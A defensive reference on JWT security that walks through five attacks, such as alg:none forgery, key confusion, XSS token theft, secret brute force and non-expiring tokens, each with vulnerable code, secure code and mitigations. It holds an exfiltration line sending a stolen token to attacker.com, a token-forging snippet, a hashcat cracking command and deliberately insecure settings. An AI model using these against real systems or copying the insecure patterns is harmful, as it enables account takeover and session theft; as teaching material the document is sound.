# JWT Security Attacks and Mitigations

## Attack 1: Algorithm None Attack (CVE-2015-9235)
**Description:** JWT header specifies alg:none meaning no signature is required. Libraries that accept this allow attackers to forge any token.
**STRIDE Category:** Spoofing, Elevation of Privilege
**MITRE ATT&CK:** T1078 Valid Accounts, T1548 Abuse Elevation Control Mechanism
**Attack Mechanism:** Attacker decodes a valid JWT, modifies the payload to change role to admin, sets alg to none, removes the signature, and submits the forged token.
**Attack Example:**
Original header: {"alg": "HS256", "typ": "JWT"}
Attacker changes to: {"alg": "none", "typ": "JWT"}
Attacker changes payload: {"sub": "1234", "role": "admin"}
Final token has no signature — server accepts it if alg:none is allowed.
**Vulnerable Code:**
```javascript
const decoded = jwt.verify(token, secret, {
    algorithms: ['HS256', 'none'] // Never allow none
});
```
**Secure Code:**
```javascript
const decoded = jwt.verify(token, secret, {
    algorithms: ['HS256'] // Enforce exactly one algorithm
});
```
**Mitigation:** Always specify exact allowed algorithms. Never include none. Reject tokens that don't match the expected algorithm.

---

## Attack 2: Algorithm Confusion (RS256 to HS256)
**Description:** When a server accepts both RS256 and HS256, an attacker can switch the algorithm and sign a forged token using the server's public key as the HMAC secret.
**STRIDE Category:** Spoofing, Elevation of Privilege
**MITRE ATT&CK:** T1078 Valid Accounts, T1548 Abuse Elevation Control Mechanism
**Attack Mechanism:**
1. Attacker obtains the server public key — often exposed at /.well-known/jwks.json
2. Creates a token with alg changed from RS256 to HS256
3. Signs it using the public key as the HMAC secret
4. Server verifies using the public key as HMAC secret — succeeds
**Attack Example:**
```python
import jwt
public_key = open('public.pem').read()
forged_token = jwt.encode(
    {"sub": "admin", "role": "superuser"},
    public_key,       # Public key used as HMAC secret
    algorithm="HS256" # Claimed as symmetric
)
```
**Secure Code:**
```javascript
// Explicitly enforce RS256 — never accept HS256 on a RS256 system
const decoded = jwt.verify(token, publicKey, {
    algorithms: ['RS256']
});
```
**Mitigation:** Never accept multiple algorithm types on the same endpoint. Separate RS256 and HS256 endpoints if both are needed.

---

## Attack 3: JWT Token Theft via XSS
**Description:** Tokens stored in localStorage are accessible to JavaScript, making them vulnerable to XSS attacks.
**STRIDE Category:** Information Disclosure, Spoofing
**MITRE ATT&CK:** T1539 Steal Web Session Cookie, T1059 Command and Scripting Interpreter
**Attack Mechanism:** Attacker injects malicious JavaScript into the page. Script reads the JWT from localStorage and exfiltrates it to attacker-controlled server.
**Attack Example:**
```javascript
// Attacker injects this via XSS
fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt'));
```
**Vulnerable Storage:**
```javascript
// Storing JWT in localStorage — accessible to any JavaScript
localStorage.setItem('jwt', token);
```
**Secure Storage:**
```javascript
// HttpOnly cookie — not accessible to JavaScript
res.cookie('token', jwt, {
    httpOnly: true,    // Cannot be read by JavaScript
    secure: true,      // HTTPS only
    sameSite: 'strict' // Prevents CSRF
});
```
**Mitigation:** Store JWTs in HttpOnly cookies. Implement Content Security Policy. Never store tokens in localStorage or sessionStorage.

---

## Attack 4: JWT Secret Brute Force
**Description:** Weak or short HMAC secrets used to sign JWTs can be brute-forced offline using tools like hashcat.
**STRIDE Category:** Spoofing, Elevation of Privilege
**MITRE ATT&CK:** T1110 Brute Force, T1078 Valid Accounts
**Attack Mechanism:** Attacker captures a valid JWT and runs offline brute force against the signature using common passwords and wordlists.
**Attack Tool Example:**
```bash
hashcat -a 0 -m 16500 captured.jwt wordlist.txt
```
**Vulnerable Configuration:**
```javascript
const token = jwt.sign(payload, 'secret123'); // Weak secret
const token = jwt.sign(payload, 'password');  // Common word
```
**Secure Configuration:**
```javascript
// Cryptographically random 256-bit secret
const secret = crypto.randomBytes(32).toString('hex');
const token = jwt.sign(payload, secret, { algorithm: 'HS256' });
```
**Mitigation:** Use cryptographically random secrets of at least 256 bits. Rotate secrets regularly. Consider RS256 with asymmetric keys for better key management.

---

## Attack 5: JWT Expiration Not Enforced
**Description:** JWTs without expiration or with long-lived tokens create a large window for attackers to use stolen tokens.
**STRIDE Category:** Spoofing, Elevation of Privilege
**MITRE ATT&CK:** T1539 Steal Web Session Cookie, T1078 Valid Accounts
**Attack Mechanism:** Attacker steals a JWT token. Because it never expires or has a very long TTL, attacker maintains access indefinitely even after user logs out.
**Vulnerable Code:**
```javascript
const token = jwt.sign({ userId: user.id }, secret);
// No expiration — valid forever
```
**Secure Code:**
```javascript
const token = jwt.sign(
    { userId: user.id },
    secret,
    { expiresIn: '15m' } // Short-lived access token
);
// Use refresh tokens for extended sessions
const refreshToken = crypto.randomBytes(40).toString('hex');
```
**Mitigation:** Set short expiration (15 minutes) on access tokens. Use refresh tokens with rotation. Implement token revocation via a blocklist for critical logout flows.

---

## JWT Security Checklist
- Never accept alg:none
- Enforce a single specific algorithm per endpoint
- Store tokens in HttpOnly cookies not localStorage
- Use secrets of at least 256 bits generated with a CSPRNG
- Set short expiration times on access tokens
- Implement refresh token rotation
- Validate all claims including iss, aud, exp, and nbf
- Log and alert on JWT validation failures
